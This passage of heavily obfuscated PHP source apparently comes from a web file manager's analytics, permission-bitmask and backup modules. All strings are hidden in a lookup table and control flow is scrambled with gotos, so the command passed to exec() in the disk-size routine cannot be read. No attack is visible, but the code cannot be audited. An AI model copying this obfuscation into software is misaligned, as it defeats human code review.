LNG($Aĝ[748]) . $Aĝ[768]); $Fú->task[$Aĝ[726]] = $Dַ; foreach ($d[$Aĝ[74]] as $aȪ) { $f暘 = IO::move($aȪ[$Aĝ[76]], $A); if (!$f暘) { $Fú->end(); $aÂ = IO::getLastError($Aĝ[769] . $aȪ[$Aĝ[76]] . $Aĝ[770] . $A . $Aĝ[504]); write_log($aÂ, $Aĝ[745]); return !1; } } goto C卑; cӽ: $d = IO::listPath($Aɋꡋ); $DǨ = isset($d[$Aĝ[74]]) ? $d[$Aĝ[74]] : array(); $Dַ = array_sum(array_column($DǨ, $Aĝ[78])); goto fʊٕ; d꣎: } private function backupPath($cȍ黻) { $AƦ =& $_SERVER[̉]; $D = $cȍ黻[$AƦ[28]]; $e֍ = Model($AƦ[733])->get($AƦ[734]); $Bΰ = substr(md5($AƦ[735] . $e֍ . $D), 0, 8); return "\x7b\x69\x6f\72{$cȍ黻[$AƦ[715]]}\x7d\57\x64\x61\164\141\x62\141\x73\145\57\142\x61\x63\x6b\x75\160\x2f" . $D . $AƦ[71] . $Bΰ; } private function tmpFilesPath() { $DѴ =& $_SERVER[̉]; $F = TEMP_FILES; if ($GLOBALS[$DѴ[6]][$DѴ[88]][$DѴ[763]]) { $F = $GLOBALS[$DѴ[6]][$DѴ[88]][$DѴ[763]]; if (!mk_dir($F) || !is_writable($F) || !IO::mkfile($F . $DѴ[764])) { $F = TEMP_FILES; } } return $F; } } goto E¹; a֊: class AnalysisModel extends ModelBaseLight { public function init($Bɠ) { $E =& $_SERVER[̉]; $AҊ = array($E[562] => array($E[29] => $E[1621], $E[271] => array($E[222], $E[728], $E[1622], $E[1623])), $E[1624] => array($E[29] => $E[1625], $E[271] => array($E[222], $E[726], $E[1626], $E[1627], $E[1628]))); if (!isset($AҊ[$Bɠ])) { return !1; } $this->optionType = $AҊ[$Bɠ][$E[29]]; $this->field = $AҊ[$Bɠ][$E[271]]; return !0; } public function listData($C = false, $f뿘 = "\155\x6f\x64\151\x66\171\x54\151\155\145", $a݂ = false) { return parent::listData($C, $f뿘, $a݂); } public function trendList($Eᖶ) { goto a鉟; a鉟: $e҈ =& $_SERVER[̉]; $Cџ = $this->listData(); if ($Cџ) { $c = end($Cџ); $b = date($e҈[1629], strtotime($e҈[1630])); if ($c[$e҈[222]] == $b) { return $Cџ; } $bŮ = strtotime($c[$e҈[222]]); } goto cʍ; A劃: foreach ($Bջ as $b) { $this->{$Aʪą}($b); } return $this->listData(); goto d; cʍ: if (!isset($bŮ)) { $a = $Eᖶ == $e҈[562] ? $e҈[506] : $e҈[793]; $bŮ = Model($a)->min($e҈[194]); } $Aʪą = $e҈[1631] . ucfirst($Eᖶ); $Bջ = $this->dateList($bŮ); goto A劃; d: } private function dateList($eĆ) { $d =& $_SERVER[̉]; $B = $eĆ; $b屟ƌ = strtotime($d[1630]); $Fč׌ = array(); while ($B <= $b屟ƌ) { $Fč׌[] = date($d[1629], $B); $B = strtotime($d[1632], $B); } return $Fč׌; } public function _recordUser($A҃ = '') { goto c; c: $f좶 =& $_SERVER[̉]; $Bܸ = strtotime(date($f좶[1633], strtotime($A҃))); $a݊ӛՆ = strtotime(date($f좶[1634], strtotime($A҃))); goto D곶; Ả: $f멖 = Model($f좶[506])->where($eה)->count($f좶[1531]); $eה[$f좶[29]] = $f좶[1635]; $e߬ = Model($f좶[1636])->where($eה)->count($f좶[1637]); goto a¥; a¥: $a = array($f좶[222] => $A҃, $f좶[728] => (int) $eݯ, $f좶[1622] => (int) $f멖, $f좶[1623] => (int) $e߬); return $this->insert($a); goto b; D곶: $eה = array($f좶[194] => array($f좶[969], $a݊ӛՆ)); $eݯ = Model($f좶[506])->where($eה)->count($f좶[1531]); $eה[$f좶[194]] = array($f좶[331], array($Bܸ, $a݊ӛՆ)); goto Ả; b: } public function _recordStore($AϚ = '') { goto eư뇦; eư뇦: $c͑پ =& $_SERVER[̉]; $FΒ = strtotime(date($c͑پ[1634], strtotime($AϚ))); $a = array($c͑پ[194] => array($c͑پ[969], $FΒ)); goto C罓; C罓: $bߦ = Model($c͑پ[450])->where($a)->sum($c͑پ[78]); $a[$c͑پ[403]] = 0; $Dմ = Model($c͑پ[793])->where($a)->sum($c͑پ[78]); goto A; C﨧: $Ë́ = Model($c͑پ[793])->where($a)->sum($c͑پ[78]); $bȱ = array($c͑پ[222] => $AϚ, $c͑پ[726] => (int) $Dմ, $c͑پ[1626] => (int) $bߦ, $c͑پ[1627] => (int) $EǮ, $c͑پ[1628] => (int) $Ë́); return $this->insert($bȱ); goto d݆; A: $a[$c͑پ[404]] = 1; $EǮ = Model($c͑پ[793])->where($a)->sum($c͑پ[78]); $a[$c͑پ[404]] = 2; goto C﨧; d݆: } public function trend($cɉ, $e֊) { goto Fэ; AȨ: return $A옉ƃ; goto dʇ; eو: if (empty($F)) { $b = date($D[1629], strtotime($D[1630])); $eы = array($D[222] => $b); foreach ($bʣ[$cɉ] as $Aޝ => $f) { $eы[$Aޝ] = 0; } $F[] = $eы; } $A옉ƃ = array(); foreach ($F as $f) { if ($cɉ == $D[1624] && $f[$D[1626]] > $f[$D[726]]) { $f[$D[1626]] = $f[$D[726]]; } foreach ($bʣ[$cɉ] as $Aޝ => $c) { $CӰ = array($D[222] => $f[$D[222]], $D[1435] => $c); $CӰ[$f݃[$cɉ]] = isset($f[$Aޝ]) ? $f[$Aޝ] : 0; $A옉ƃ[] = $CӰ; } } goto AȨ; Fэ: $D =& $_SERVER[̉]; if (!$this->init($cɉ)) { return !1; } $F = $this->trendList($cɉ); goto D瓧; D瓧: if ($F && $e֊ != $D[1505]) { $Fʚ = $F[0][$D[222]]; $eᲅ = $this->validDate($e֊, $Fʚ); $Dۑ = array(); $E߽ = array_to_keyvalue($F, $D[222]); foreach ($eᲅ as $b) { if (isset($E߽[$b])) { $CӰ = $E߽[$b]; } else { $CӰ = end($F); $CӰ[$D[222]] = $b; if ($cɉ == $D[562]) { $CӰ[$D[1622]] = $CӰ[$D[1623]] = 0; } } $Dۑ[] = $CӰ; } $F = $Dۑ; } $bʣ = array($D[562] => array($D[728] => LNG($D[1638]), $D[1622] => LNG($D[1639]), $D[1623] => LNG($D[1640])), $D[1624] => array($D[726] => LNG($D[1641]), $D[1626] => LNG($D[1642]), $D[1627] => LNG($D[1643]), $D[1628] => LNG($D[1644]))); $f݃ = array($D[562] => $D[1645], $D[1624] => $D[78]); goto eو; dʇ: } public function validDate($Bю, $e㮨) { goto eڵ; eڵ: $aԯ =& $_SERVER[̉]; $b㧠 = date($aԯ[1629], strtotime($aԯ[1630])); $a = array($b㧠); goto fȤ; fȤ: switch ($Bю) { case $aԯ[1512]: $d̐ = mktime(0, 0, 0, date($aԯ[1646]), date($aԯ[1254]) - date($aԯ[1316]) + 7 - 7, date($aԯ[1647])); $E = 0; do { $c΋ = date($aԯ[1629], $d̐ - 3600 * 24 * 7 * $E); $a[] = $c΋; $E++; } while ($e㮨 < $c΋); break; case $aԯ[1510]: $E = 1; do { $aƻ݈ = date($aԯ[1648], strtotime("\x2d\40{$E}\x20\x6d\x6f\x6e\164\150\x73")); $a[] = $aƻ݈; $E++; } while ($e㮨 < $aƻ݈); break; case $aԯ[1649]: $e = (int) date($aԯ[1647], strtotime($e㮨)); $A֟ = (int) date($aԯ[1647]); if ($e >= $A֟) { break; } for ($e; $e < $A֟; $e++) { $a[] = $e . $aԯ[1650]; } break; default: break; } if ($e㮨 > end($a)) { array_pop($a); } sort($a); goto B; B: return $a; goto eԆ; eԆ: } public function listTable($A) { $cȻ = ucfirst($A); return Model($cȻ)->listData(); } public function option($A) { $D͐͝ = $_SERVER[̉][1651] . ucfirst($A); return $this->{$D͐͝}(); } private function optionUser() { goto b󱘎; Dʲի: if (!$d׿) { $d׿ = 1; } $EׄƇ = array($dܝ[1653] => array($dܝ[970], $Dؓ)); $d = Model($dܝ[506])->where($EׄƇ)->count($dܝ[1531]); goto A䤟; A䤟: return array($dܝ[722] => (int) $DƑ, $dܝ[1654] => (int) ($DƑ - $Dޝ), $dܝ[1655] => (int) $Dޝ, $dܝ[1656] => (int) $d, $dܝ[1657] => $d׿); goto b쒏ü; D: if ($cẖ < $Dؓ) { $cẖ = $Dؓ; } $EׄƇ = array($dܝ[1653] => array($dܝ[970], $cẖ)); $d׿ = (int) Model($dܝ[506])->where($EׄƇ)->count($dܝ[1531]); goto Dʲի; A㧡: $c = intval($GLOBALS[$dܝ[6]][$dܝ[347]][$dܝ[1491]]) / 3600; $cẖ = strtotime("\55{$c}\40\x68\157\165\x72\x73"); $Dؓ = strtotime(date($dܝ[1633])); goto D; b󱘎: $dܝ =& $_SERVER[̉]; $DƑ = Model($dܝ[506])->count($dܝ[1531]); $Dޝ = Model($dܝ[506])->where($dܝ[1652])->count($dܝ[1531]); goto A㧡; b쒏ü: } private function optionFile() { goto F; Bͳ: $eƎ = $c񟣓[$eǧގ[1626]]; $eÐ = Model($eǧގ[793])->where(array($eǧގ[403] => 0))->count($eǧގ[395]); $bү = array($eǧގ[403] => 0, $eǧގ[194] => array($eǧގ[970], strtotime(date($eǧގ[1633])))); goto E; F: $eǧގ =& $_SERVER[̉]; $c񟣓 = $this->sourceSize(); $EԢ = $c񟣓[$eǧގ[78]]; goto Bͳ; E: $A = Model($eǧގ[793])->where($bү)->sum($eǧގ[78]); $F؃ = Model($eǧގ[793])->where($bү)->count($eǧގ[395]); return array($eǧގ[726] => $EԢ, $eǧގ[1626] => $eƎ, $eǧގ[1658] => $EԢ - $eƎ, $eǧގ[1659] => (int) $A, $eǧގ[728] => (int) $eÐ, $eǧގ[1660] => (int) $F؃); goto bì; bì: } private function optionAccess() { $a =& $_SERVER[̉]; return array($a[722] => $this->typeLogCnt(), $a[107] => $this->typeLogCnt($a[107]), $a[430] => $this->typeLogCnt($a[430]), $a[1661] => $this->typeLogCnt($a[1661]), $a[1662] => $this->typeLogCnt($a[1662]), $a[562] => $this->typeLogCnt($a[33], $a[1637])); } private function typeLogCnt($Aվ = '', $B = "\x69\x64") { goto dۄۍ; b֌: $a둰 = array($fŻۑ[194] => array($fŻۑ[970], $d)); if ($Aվ) { $a둰[$fŻۑ[29]] = array($fŻۑ[7], $e퇃[$Aվ]); } $bϒЖ = Model($fŻۑ[1636])->where($a둰)->count($B); goto D; D: return (int) $bϒЖ; goto C; dۄۍ: $fŻۑ =& $_SERVER[̉]; $e퇃 = array($fŻۑ[107] => array($fŻۑ[1663], $fŻۑ[1664]), $fŻۑ[430] => array($fŻۑ[1665], $fŻۑ[1666]), $fŻۑ[1661] => array($fŻۑ[1667], $fŻۑ[1668], $fŻۑ[1669]), $fŻۑ[1662] => array($fŻۑ[1670], $fŻۑ[1671]), $fŻۑ[1672] => array($fŻۑ[1673], $fŻۑ[1674], $fŻۑ[1675])); $d = strtotime(date($fŻۑ[1633])); goto b֌; C: } private function optionServer() { goto Fٲ; E򷹚܊: if ($fű == $cۮ[758]) { $bŹ = explode($cۮ[1166], $d[$cۮ[930]]); $fű = $bŹ[0]; } if ($fű == $cۮ[761] || $fű == $cۮ[762]) { $E = Model()->db()->query($cۮ[1676]); $C = $E[0] && isset($E[0][$cۮ[1434]]) ? $E[0][$cۮ[1434]] : 0; $fű = $cۮ[1677] . ($C ? $cۮ[8] . $C : $cۮ[33]); } $F = $GLOBALS[$cۮ[6]][$cۮ[347]][$cۮ[795]]; goto c; Fٲ: $cۮ =& $_SERVER[̉]; $EƮ = $this->diskDriver(); $dĢ = KodIO::defaultDriver(); goto aלۆ; c: return array($cۮ[1678] => $EƮ ? $EƮ[$cۮ[1679]] : 0, $cۮ[1680] => $EƮ ? $EƮ[$cۮ[1681]] : 0, $cۮ[1682] => (int) $dĢ[$cۮ[1679]] * 1024 * 1024 * 1024, $cۮ[1683] => (int) $D獛, $cۮ[1684] => ucfirst($Aą), $cۮ[1685] => $cۮ[1686] . PHP_VERSION, $cۮ[1687] => phpBuild64() ? 64 : 32, $cۮ[721] => str_replace($cۮ[1688], $cۮ[947], $fű), $cۮ[347] => ucfirst($F), $cۮ[28] => $_SERVER[$cۮ[1689]]); goto aϞ; a: $Aą = $B[0]; $d = $GLOBALS[$cۮ[6]][$cۮ[17]]; $fű = $d[$cۮ[931]]; goto E򷹚܊; aלۆ: $f = array($cۮ[785] => $dĢ[$cۮ[393]]); $D獛 = Model($cۮ[450])->where($f)->sum($cۮ[78]); $B = explode($cۮ[50], $_SERVER[$cۮ[142]]); goto a; aϞ: } private function diskDriver() { goto F; Dω: if ($bэ) { $f = $C[1692]; if (function_exists($C[1693])) { exec($C[1694], $c⏉); $f = $c⏉[1] . $C[8]; } } if (!file_exists($f)) { return; } $bë = @disk_total_space($f); goto C܌; C܌: $Aʟ = $bë - @disk_free_space($f); return array($C[1679] => $bë, $C[1681] => $Aʟ); goto aѡڡ; F: $C =& $_SERVER[̉]; $f = $C[8]; $bэ = $GLOBALS[$C[6]][$C[1690]] == $C[1691]; goto Dω; aѡڡ: } public function fileChart($Eǆ) { goto b; E̩׬: $cͯ[$Dژ[404]] = 2; $C٥ = Model($Dژ[793])->where($cͯ)->sum($Dژ[78]); return array($Dژ[726] => $C[$Dژ[78]], $Dژ[1626] => $C[$Dژ[1626]], $Dژ[1627] => (int) $Cн, $Dژ[1628] => (int) $C٥); goto e⦮݊; b: $Dژ =& $_SERVER[̉]; if (isset($Eǆ[$Dژ[1531]])) { return Model($Dژ[793])->userFileTypeProfile($Eǆ[$Dژ[1531]]); } if (isset($Eǆ[$Dژ[1695]])) { return Model($Dژ[793])->groupFileTypeProfile($Eǆ[$Dژ[1695]]); } goto c; c: $C = $this->sourceSize(); $cͯ = array($Dژ[478] => 0, $Dژ[404] => 1); $Cн = Model($Dژ[793])->where($cͯ)->sum($Dژ[78]); goto E̩׬; e⦮݊: } private function sourceSize() { $dЗ̶ˌ =& $_SERVER[̉]; $eߊŇ = Model($dЗ̶ˌ[793])->where(array($dЗ̶ˌ[403] => 0))->sum($dЗ̶ˌ[78]); $E׈ = Model($dЗ̶ˌ[450])->sum($dЗ̶ˌ[78]); if ($E׈ > $eߊŇ) { $E׈ = $eߊŇ; } return array($dЗ̶ˌ[78] => (int) $eߊŇ, $dЗ̶ˌ[1626] => (int) $E׈); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $c =& $_SERVER[̉]; $bԜ = array(array($c[413] => LNG($c[1696]), $c[1697] => $c[1698], $c[1699] => 1, $c[1700] => 1, $c[1701] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($c[413] => LNG($c[1702]), $c[1697] => $c[1703], $c[1699] => 2, $c[1700] => 1, $c[1701] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($c[413] => LNG($c[1704]), $c[1697] => $c[1705], $c[1699] => 3, $c[1700] => 1, $c[1701] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($c[413] => LNG($c[1706]), $c[1697] => $c[1707], $c[1699] => 4, $c[1700] => 1, $c[1701] => self::AUTH_SHOW | self::AUTH_VIEW), array($c[413] => LNG($c[1708]), $c[1697] => $c[1709], $c[1699] => 5, $c[1700] => 1, $c[1701] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($c[413] => LNG($c[1710]), $c[1697] => $c[1711], $c[1699] => 6, $c[1700] => 1, $c[1701] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($c[413] => LNG($c[1712]), $c[1697] => $c[1713], $c[1699] => 7, $c[1700] => 1, $c[1701] => 0)); return $bԜ; } public static function authCheck($Bٵ, $F) { $Bٵ = intval($Bٵ); if ($GLOBALS[$_SERVER[̉][485]]) { return !0; } if ($Bٵ <= 0) { return !1; } if (($Bٵ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Bٵ & $F); } public static function authCheckShow($cհ) { return self::authCheck($cհ, self::AUTH_SHOW); } public static function authCheckView($eۋɪ) { return self::authCheck($eۋɪ, self::AUTH_VIEW); } public static function authCheckDownload($D) { return self::authCheck($D, self::AUTH_DOWNLOAD); } public static function authCheckUpload($a뉰Ѵ) { return self::authCheck($a뉰Ѵ, self::AUTH_UPLOAD); } public static function authCheckEdit($Eⳛϖ) { return self::authCheck($Eⳛϖ, self::AUTH_EDIT); } public static function authCheckRemove($aߐ) { return self::authCheck($aߐ, self::AUTH_REMOVE); } public static function authCheckShare($aλ) { return self::authCheck($aλ, self::AUTH_SHARE); } public static function authCheckComment($a) { return self::authCheck($a, self::AUTH_COMMENT); } public static function authCheckEvent($c) { return self::authCheck($c, self::AUTH_EVENT); } public static function authCheckRoot($bߌӤ) { return self::authCheck($bߌӤ, self::AUTH_ROOT); } public static function authCheckAction($Dׄ, $D) { goto FɈ; Bɢ: $F跫 = $Fծ蔧[$D]; $Dׄ = intval($Dׄ); if ($Dׄ <= 0) { return !1; } goto c; FɈ: $A힬 =& $_SERVER[̉]; $Fծ蔧 = array($A힬[1714] => self::AUTH_VIEW, $A힬[1093] => self::AUTH_DOWNLOAD, $A힬[107] => self::AUTH_UPLOAD, $A힬[1662] => self::AUTH_EDIT, $A힬[1661] => self::AUTH_REMOVE, $A힬[1672] => self::AUTH_SHARE, $A힬[352] => self::AUTH_COMMENT, $A힬[1520] => self::AUTH_EVENT, $A힬[1715] => self::AUTH_ROOT); if (!isset($Fծ蔧[$D])) { return; } goto Bɢ; c: if (($Dׄ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Dׄ & $F跫); goto e; e: } public static function authDisable($D퍉來, $C՜) { if (intval($D퍉來) <= 0) { return 0; } return intval($D퍉來) & ~$C՜; } public $optionType = "\x53\x79\x73\x74\x65\155\56\x73\x6f\x75\162\143\145\101\x75\164\150\114\151\163\164"; public $field = array("\x6e\x61\x6d\x65", "\x61\165\x74\150", "\x6c\x61\x62\x65\154", "\144\151\163\160\154\141\171", "\x73\x79\163\x74\x65\x6d", "\x73\157\x72\164"); public function initData() { $Aٍ = $this->authDefault(); foreach ($Aٍ as $f) { $this->add($f); } } public function listData($f = false, $c䪌 = "\x73\x6f\162\x74", $fÉý = false) { return parent::listData($f, $c䪌, $fÉý); } public function update($F, $C) { $c =& $_SERVER[̉]; $Fђ = parent::listData($F); $fξ = $this->findByName($C[$c[28]]); if (!$Fђ || $fξ && $fξ[$c[393]] != $Fђ[$c[393]]) { return !1; } $this->filterAuth($C[$c[406]]); return parent::update($F, $C); } public function remove($a) { $bǔ = parent::listData($a); if (!$bǔ || $bǔ[$_SERVER[̉][1170]]) { return !1; } return parent::remove($a); } public function add($eʑ֓ = array()) { goto F摭; F摭: $fơ仗 =& $_SERVER[̉]; if ($this->findByName($eʑ֓[$fơ仗[28]])) { return !1; } $dʏ = array($fơ仗[28] => $fơ仗[33], $fơ仗[406] => 1, $fơ仗[1716] => $fơ仗[1705], $fơ仗[1717] => 1, $fơ仗[1170] => 0, $fơ仗[1718] => 0); goto aʕ; aʕ: $eʑ֓ = array_merge($dʏ, $eʑ֓); $eʑ֓[$fơ仗[1718]] = $this->getSort(); $this->filterAuth($eʑ֓[$fơ仗[406]]); goto D浯օ; D浯օ: return parent::insert($eʑ֓); goto d˄ڏ; d˄ڏ: } private function getSort() { $B =& $_SERVER[̉]; $aȂͬ = parent::listData(); $F = array_to_keyvalue($aȂͬ, $B[33], $B[1718]); return empty($F) ? 0 : max($F) + 1; } private function filterAuth(&$E򫳃) { goto fǰ; c: foreach ($A as $a˲Ȼ) { if (isset($aؘ[$a˲Ȼ])) { $A = array_merge($A, $aؘ[$a˲Ȼ]); } } $A[] = self::AUTH_SHOW; $E򫳃 = array_sum(array_unique($A)); goto B; fǰ: if (!$E򫳃) { return; } $BΎӱ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $A = array(); goto aʓ; aʓ: foreach ($BΎӱ as $a˲Ȼ) { if ($E򫳃 & $a˲Ȼ) { $A[] = $a˲Ȼ; } } if (in_array(self::AUTH_ROOT, $A)) { $E򫳃 = array_sum($BΎӱ); return; } $aؘ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto c; B: } public function sort($bߨ, $e) { return parent::update($bߨ, $e); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\x2e\142\x61\143\153\165\160\114\x69\x73\x74"; public $field = array("\151\x6f", "\x6e\x61\155\x65", "\163\x74\x61\164\165\x73", "\x63\157\x6e\x74\145\156\164", "\155\x61\x6e\x75\x61\x6c", "\x72\145\163\x75\x6c\164", "\x74\151\x6d\145\106\x72\x6f\x6d", "\164\151\155\x65\124\x6f"); public function config() { goto Fߪ; d: $Aĥֆ = Model($Fۼ[1721])->findByKey($Fۼ[1520], $EŅ); if (!$Aĥֆ) { $Aĥֆ = array(); } if (isset($Aĥֆ[$Fۼ[197]])) { $Aĥֆ[$Fۼ[197]] = json_decode($Aĥֆ[$Fۼ[197]], !0); } goto c҆; Cߒ: $a쇿լ = is_array($a쇿լ) ? $a쇿լ : array(); if (!isset($a쇿լ[$Fۼ[718]])) { $a쇿լ[$Fۼ[718]] = $Fۼ[87]; } unset($a쇿լ[$Fۼ[1502]]); goto Cշ; Fߪ: $Fۼ =& $_SERVER[̉]; $a쇿լ = Model($Fۼ[733])->get($Fۼ[745]); $a쇿լ = json_decode($a쇿լ, !0); goto Cߒ; c҆: if (isset($a쇿լ[$Fۼ[197]])) { $Aĥֆ[$Fۼ[197]][$Fۼ[1505]] = $a쇿լ[$Fۼ[197]]; unset($a쇿լ[$Fۼ[197]]); } return array_merge($Aĥֆ, $a쇿լ); goto C; Cշ: Action($Fۼ[1719])->taskInit(); Model($Fۼ[1501])->cacheClear(); $EŅ = $Fۼ[1720]; goto d; C: } public function listData($c = false, $B = "\155\x6f\x64\x69\x66\x79\124\x69\x6d\x65", $b = false) { return parent::listData($c, $B, !0); } public function lastItem() { $E = $this->listData(); return !empty($E[0]) ? $E[0] : null; } public function kill($a) { goto C; C: $eڿ =& $_SERVER[̉]; $E␣ = $this->listData($a); if (!$E␣ || empty($E␣[$eڿ[28]])) { return !0; } goto B; B: Task::kill($eڿ[744]); Task::kill($eڿ[767]); Task::kill($eڿ[777]); goto Aҥ; Aҥ: $Eąύ = $E␣[$eڿ[28]]; $Cħ = TEMP_FILES . $eڿ[741] . $Eąύ . $eڿ[8]; IO::remove($Cħ, !1); goto Bަ; Bަ: return $this->remove($a); goto dҮ; dҮ: } public function remove($bʢұ) { $eވζ = $this->listData($bʢұ); if (!$eވζ) { return !0; } return $this->backupRemove($eވζ); } private function backupRemove($c޲ֿ) { parent::remove($c޲ֿ[$_SERVER[̉][393]]); $dޛ = $this->backupPath($c޲ֿ); IO::remove($dޛ, !1); return !0; } private function backupPath($eґ) { $D =& $_SERVER[̉]; $a = $eґ[$D[28]]; $E = Model($D[733])->get($D[734]); $Fڅ = substr(md5($D[735] . $E . $a), 0, 8); return "\x7b\151\x6f\72{$eґ[$D[715]]}\175\x2f\144\x61\x74\x61\142\x61\163\x65\x2f\x62\141\143\153\x75\x70\57" . $a . $D[71] . $Fڅ; } public function start() { goto D; A: if (!$aͥύ || $aͥύ[$cˤ[1502]] != $cˤ[87]) { return !1; } $a΍݂ = $this->process(); foreach ($a΍݂ as $EǨ) { if ($EǨ) { return Task::restart($EǨ[$cˤ[393]]); } } goto Fɺ; D: $cˤ =& $_SERVER[̉]; if ($GLOBALS[$cˤ[6]][$cˤ[88]][$cˤ[1722]] != $cˤ[87]) { return !0; } $aͥύ = $this->config(); goto A; Fɺ: $E = new Backup(); $bבϾ = $E->db(); if ($bבϾ) { $bבϾ = $E->dbFile(); if ($bבϾ && $aͥύ[$cˤ[718]] == $cˤ[191]) { $bבϾ = $E->file(); } } goto b抸; b抸: Backup::set(array($cˤ[713] => 1, $cˤ[476] => time())); return !0; goto Cћ; Cћ: } public function process() { $Dݕ =& $_SERVER[̉]; return array($Dݕ[721] => Task::get($Dݕ[744]), $Dݕ[725] => Task::get($Dݕ[767]), $Dݕ[193] => Task::get($Dݕ[777])); } public function restore() { $B =& $_SERVER[̉]; ActionCall($B[1017], !0, 1); ActionCall($B[1017], !0, 0); } } goto e긜; E¹: class BackupFile { public function __construct() { } public function index() { goto D؎; e魞: $aʗڈъ->task[$_SERVER[̉][726]] = $a; $f渾 = array($_SERVER[̉][779] => $f酊, $_SERVER[̉][780] => $a, $_SERVER[̉][781] => time()); Backup::set($f渾); goto aߟ; eğП: $f渾 = array($_SERVER[̉][791] => 1, $_SERVER[̉][476] => time(), $_SERVER[̉][738] => 1, $_SERVER[̉][788] => $b̈, $_SERVER[̉][780] => $a, $_SERVER[̉][779] => $f酊, $_SERVER[̉][792] => time()); if ($fș) { $f渾[$_SERVER[̉][789]] = $aɒ; $f渾[$_SERVER[̉][790]] = $c; } Backup::set($f渾); goto Dބȶ; bΑÿ: $c = $aɒ = 0; do { $EڌǗ = $_SERVER[̉][782]; $cՅ = Model($_SERVER[̉][750])->where($f)->field($EڌǗ)->order($_SERVER[̉][783])->selectPage($C, $bӱ); $D˨ = !empty($cՅ[$_SERVER[̉][367]]) ? $cՅ[$_SERVER[̉][367]] : array(); foreach ($D˨ as $E) { goto E; E: if (!$this->_fileExist($E, $C咅, $Fƞ)) { $f酊 -= 1; $a -= (int) $E[$_SERVER[̉][78]]; write_log("\146\151\154\145\40\156\x6f\x74\40\145\x78\151\163\x74\x2e\146\x69\x6c\x65\111\x44\72{$E[$_SERVER[̉][447]]}\54\x20\160\141\x74\150\72{$E[$_SERVER[̉][76]]}", $_SERVER[̉][784]); continue; } $A暇 = $E[$_SERVER[̉][76]]; $Dܹ = "\173\x69\x6f\x3a{$CȌ[$_SERVER[̉][715]]}\x7d" . substr($A暇, strlen("\173\x69\x6f\x3a{$E[$_SERVER[̉][785]]}\x7d")); goto cᄊ; F׊: $f += $E[$_SERVER[̉][78]]; $aɒ += 1; $c += $E[$_SERVER[̉][78]]; goto d; cᄊ: if (IO::exist($Dܹ)) { $aʗڈъ->updateFileEnd($E[$_SERVER[̉][28]], $E[$_SERVER[̉][78]]); } else { $Dܹ = get_path_father($Dܹ); IO::mkdir($Dܹ); if (!IO::copy($A暇, $Dܹ, $_SERVER[̉][786])) { write_log($_SERVER[̉][787] . $A暇 . $_SERVER[̉][770] . $Dܹ . $_SERVER[̉][504], $_SERVER[̉][745]); $Cގ = !1; break; } } $b̈ = $E[$_SERVER[̉][447]]; $fș += 1; goto F׊; d: if ($f >= 1024 * 1024 * 100) { $f渾 = array($_SERVER[̉][788] => $b̈, $_SERVER[̉][789] => $aɒ, $_SERVER[̉][790] => $c); Backup::set($f渾); $f = $fș = 0; } goto a; a: } $cю = count($D˨); $bӱ++; } while ($cю == $C); $aʗڈъ->end(); goto eğП; Dބȶ: $this->_fileFilter($C咅); return !0; goto e͟; D؎: $CȌ = Backup::get(); $b̈ = $CȌ[$_SERVER[̉][291]][$_SERVER[̉][193]][$_SERVER[̉][447]]; $f = array($_SERVER[̉][448] => array($_SERVER[̉][775], $b̈), $_SERVER[̉][776] => array($_SERVER[̉][329], $CȌ[$_SERVER[̉][715]])); goto DÈ; aߟ: $Cގ = !0; $Fƞ = $this->storeIds(); $bӱ = 1; goto Dƈَ; DÈ: $f酊 = (int) Model($_SERVER[̉][750])->where($f)->count($_SERVER[̉][447]); $a = (int) Model($_SERVER[̉][750])->where($f)->sum($_SERVER[̉][78]); $aʗڈъ = new TaskFileTransfer($_SERVER[̉][777], $_SERVER[̉][745], $f酊, LNG($_SERVER[̉][746]) . $_SERVER[̉][747] . LNG($_SERVER[̉][778])); goto e魞; Dƈَ: $C = 1000; $f = $fș = 0; $C咅 = array(); goto bΑÿ; e͟: } private function _fileExist($Cɥ㣂, &$c톎, $c) { goto C; C: $f =& $_SERVER[̉]; $B󻄵 = $Cɥ㣂[$f[76]]; if (in_array($Cɥ㣂[$f[447]], $c톎)) { return !1; } goto A; A戏ų: if (IO::exist($aϸ)) { $c톎[] = $Cɥ㣂[$f[447]]; return !1; } $F = array($f[785] => $Cɥ㣂[$f[785]], $f[76] => array($f[380], "{$aϸ}\x25")); $bƼ = Model($f[750])->where($F)->field($f[448])->select(); goto d; A: if (!in_array($Cɥ㣂[$f[785]], $c)) { return !1; } if 